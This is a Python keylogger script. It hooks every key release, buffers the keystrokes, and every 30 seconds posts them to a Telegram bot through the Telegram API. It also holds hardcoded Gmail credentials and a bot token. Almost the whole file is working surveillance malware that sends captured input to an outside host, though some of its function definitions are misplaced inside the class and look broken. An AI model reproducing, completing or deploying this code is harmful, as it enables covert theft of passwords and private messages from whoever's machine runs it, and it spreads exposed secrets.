import keyboard # for keylogs
import smtplib # for sending email using SMTP protocol (gmail)
# Semaphore is for blocking the current thread
# Timer is to make a method runs after an `interval` amount of time
from threading import Semaphore, Timer
import requests
    
SEND_REPORT_EVERY = 30 # .50 minutes
EMAIL_ADDRESS = "ryugakeylogger@gmail.com"
EMAIL_PASSWORD = "hgkeylogger"

class Keylogger:
    def __init__(self, interval):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        # this is the string variable that contains the log of all 
        # the keystrokes within `self.interval`
        self.log = ""
        # for blocking after setting the on_release listener
        self.semaphore = Semaphore(0)

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name
    
    

    Token= "1290543470:AAENBVtiTFOZVcAJ0LguPEvDXXSt3qhGU9M"
    url="https://api.telegram.org/bot1290543470:AAENBVtiTFOZVcAJ0LguPEvDXXSt3qhGU9M/"


    def send_message(chat_id,message_text):
        params = {"chat_id":chat_id,"text":message_text}
        response = requests.post(url + "sendMessage",data=params)
        return response

    id='1152801694'

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            print (self.log)
            send_message(id, self.log)
            # can print to a file, whatever you want
            # print(self.log)
        self.log = ""
        Timer(interval=self.interval, function=self.report).start()

    def start(self):
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # block the current thread,
        # since on_release() doesn't block the current thread
        # if we don't block it, when we execute the program, nothing will happen
        # that is because on_release() will start the listener in a separate thread
        self.semaphore.acquire()

    
if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()

